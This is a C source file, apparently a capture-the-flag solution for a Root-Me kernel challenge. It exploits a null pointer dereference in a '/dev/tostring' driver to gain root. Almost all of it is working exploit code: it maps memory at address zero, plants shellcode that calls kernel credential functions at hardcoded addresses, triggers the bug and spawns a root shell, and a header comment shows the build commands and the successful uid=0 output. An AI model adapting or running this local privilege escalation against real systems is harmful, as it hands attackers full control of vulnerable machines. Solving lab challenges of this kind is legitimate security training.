/*
    On a linux machine:
    vagrant@ubuntu-focal:~$ cat shellcode.s
      bits 32

      commit_cred:
        xor eax, eax
        call 0xc10711f0
        call 0xc1070e80
        ret

    vagrant@ubuntu-focal:~$ nasm -f bin shellcode.s -o creds.bin 
    Just need then to put the compiled shellcode in C form.

    vagrant@ubuntu-focal:~$ gcc -o exploit null_deref.c -m32 -static -mtune=i686
    
    On the target machine:
    Root-Me user@linkern-chall:~$ /mnt/share/exploit
    [+] mmapping at null address
    [+] mmap success
    [+] Copying commit_creds shellcode
    [+] shellcode set at null address. Let's try to execute it
    [+] Deleting the stack, setting tostring->tostring_read to NULL
    [+] Triggering tostring->tostring_read(...)
    [+] I think you're now root my dear
    [+] Trying to spawn shell
    /home/user # id
    uid=0(root) gid=0
    /home/user # 
 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

#define DEV "/dev/tostring"
#define DELETE_STACK "**********S"

int trigger(int fd);
void shell();

int trigger(int fd) {
    char b[32];
    printf("[+] Deleting the stack, setting tostring->tostring_read to NULL\n");
    if (write(fd, DELETE_STACK, 11) < 0 ) {
        perror("[!] Failed to delete stack");
        return errno;
    }
    
    printf("[+] Triggering tostring->tostring_read(...)\n");
    
    if (read(fd, b, 32) < 0) {
        return errno;
    }
    return 0;
}

void shell(){
    char *shell = "/bin/sh";
    char *args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);
}

char creds_shellcode[] = "\x31\xc0\xe8\xe9\x11\x07"
        "\xc1\xe8\x74\x0e\x07\xc1\xc3";

int main(void) {
    int fd;
    
    fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("[!] Failed to open device");
        return -1;
    }
    
    printf("[+] mmapping at null address\n");
    char* map = NULL;
    map = mmap((void*)0x0, 0x1000, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);
    if (map == MAP_FAILED) {
      perror("[!] Failed to mmap");
      return -1;
    }

    printf("[+] mmap success\n");    
    printf("[+] Copying commit_creds shellcode\n");

    if (memcpy(map, creds_shellcode, 13) != NULL) {
      perror("[!] Failed to copy commit_creds shellcode");
      return -1;
    }

    printf("[+] shellcode set at null address. Let's try to execute it\n");    
    
    if (trigger(fd) < 0) {
        perror("[!] Failed to trigger null pointer deref");
        return -1;
    }

    printf("[+] I think you're now root my dear\n");
    printf("[+] Trying to spawn shell\n");
    
    shell();
    close(fd);
    return 0;
}

